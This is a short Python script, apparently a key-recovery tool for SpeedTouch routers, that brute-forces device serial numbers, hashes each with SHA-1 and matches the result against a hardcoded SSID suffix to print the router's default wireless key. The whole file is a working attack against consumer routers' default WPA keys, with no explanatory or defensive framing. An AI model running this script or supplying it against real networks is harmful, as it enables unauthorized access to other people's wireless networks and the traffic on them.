#!/usr/bin/env python3

import sys
import hashlib
import binascii

ssid = "F8A3D0"
print("[*] Testing on ssid", "SpeedTouch"+ssid)
ssid_lower = ssid.lower()
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def check(serial):
    serial = serial[:-3] + binascii.hexlify(serial[-3::].encode('utf-8')).decode("utf-8")

    hash = hashlib.sha1(serial.encode('utf-8'))
    hash = hash.hexdigest()

    if hash[-6::] == ssid_lower:
        print("[*] Found key", hash[:10].upper())

for year in range(5, 15):
    for week in range(1, 52):
        for x1 in range(0, 36):
            for x2 in range(0, 36):
                for x3 in range(0, 36):
                    check("CP" + str(year).zfill(2) + str(week).zfill(2)+ chars[x1] + chars[x2] + chars[x3])